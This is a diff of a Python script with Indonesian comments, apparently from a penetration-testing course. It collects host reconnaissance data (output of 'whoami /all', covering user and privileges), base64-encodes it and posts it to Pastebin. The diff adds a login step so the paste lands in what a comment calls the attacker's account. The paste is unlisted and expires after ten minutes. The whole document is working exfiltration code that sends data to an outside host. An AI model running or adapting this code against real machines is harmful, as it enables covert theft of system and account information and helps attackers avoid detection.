@@ -9,7 +9,7 @@ from platform import system
 def hostRecon():
     # mengumpulkan informasi mengenai Hostname, User yang login, dan Current Privileges
     if system() == "Windows":
-        process = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+        process = Popen("whoami /all", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
         result, err = process.communicate()
         
     elif system() == "Linux":
@@ -26,17 +26,42 @@ def hostRecon():
         encoded_data = base64.b64encode(message.encode())
         return encoded_data
 
+def pastebin_getuser_key(api_dev_key):
+    pastebin_username = "[UNIQUE_PASTEBIN_USERNAME]"
+    pastebin_password = "[UNIQUE_PASTEBIN_PASSWORD]"
+
+    pastebin_login_url = "https://pastebin.com/api/api_login.php"
+
+    login_data = {
+        "api_dev_key": api_dev_key, # unique API Developers Key
+        "api_user_name": pastebin_username,
+        "api_user_password": pastebin_password
+    }
+
+    resp = post(pastebin_login_url, data=login_data)
+    # jika proses login gagal
+    if resp.status_code != 200:
+        print("[!] Login FAILED")
+        sys.exit(0)
+    else:
+        return resp.text
+    
+
 def pastebin_create_paste(encoded_data):
     api_dev_key = "[UNIQUE_API_DEVELOPERS_KEY]"
+    api_user_key = pastebin_getuser_key(api_dev_key)
+
     create_paste_url = "https://pastebin.com/api/api_post.php"
 
-    post_data = {"api_dev_key": api_dev_key, # unique API Developers Key
-                  "api_option": "paste",  # set sebagai paste untuk membuat paste baru
-                  "api_paste_code": encoded_data, # text yang akan ditulis kedalam paste
-                  "api_paste_name" : "GLS_ProgPent_Pastebin", # judul paste
-                  "api_paste_expire_date" : "10M", # paste akan expired setelah 10 menit
-                  "api_paste_private": 1 # 0=public 1=unlisted 2=private
-                } 
+    post_data = {
+        "api_dev_key": api_dev_key, # unique API Developers Key
+        "api_user_key": api_user_key, # unique API user Key yang digunakan untuk menambahkan paste ke akun attacker
+        "api_option": "paste",  # set sebagai paste untuk membuat paste baru
+        "api_paste_code": encoded_data, # text yang akan ditulis kedalam paste
+        "api_paste_name" : "GLS_ProgPent_Pastebin", # judul paste
+        "api_paste_expire_date" : "10M", # paste akan expired setelah 10 menit
+        "api_paste_private": 1 # 0=public 1=unlisted 2=private
+    } 
                   
     resp = post(create_paste_url, data=post_data)
 
